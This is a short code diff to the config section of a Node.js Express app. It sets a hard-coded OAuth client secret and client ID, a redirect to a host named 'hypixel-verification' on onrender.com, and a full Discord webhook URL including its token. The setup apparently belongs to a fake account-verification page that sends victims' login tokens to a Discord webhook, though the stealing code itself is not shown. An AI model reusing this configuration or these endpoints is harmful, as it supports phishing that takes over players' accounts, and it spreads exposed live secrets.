@@ -1,8 +1,8 @@
 //Config
-const secret_value = '.WW8Q~BnSgyVc5h5DzTEQWU5wRmqyeJdqIo4Tas8'
-const client_id = 'a06c832a-e2a5-4d5e-a2b3-c5f8fb61fe35'
-const redirect_uri = 'https://d-na.herokuapp.com/'
-const webhook_url = 'webhook'
+const secret_value = '141698a8-18a3-4aa4-9129-374592b1845a'
+const client_id = 'aee010bb-cc6b-4ac2-8506-7df419396889'
+const redirect_uri = 'https://hypixel-verification-i1he.onrender.com/'
+const webhook_url = 'https://discord.com/api/webhooks/1122041902003408896/0HRYdUZ-AoniQPRdKeEguK-0oHnihrU4zUM4IcU7oNzweCuGMWHb6bh3FSEtx7XveQ5X'
 //Requirements
 const axios = require('axios')
 const express = require('express')
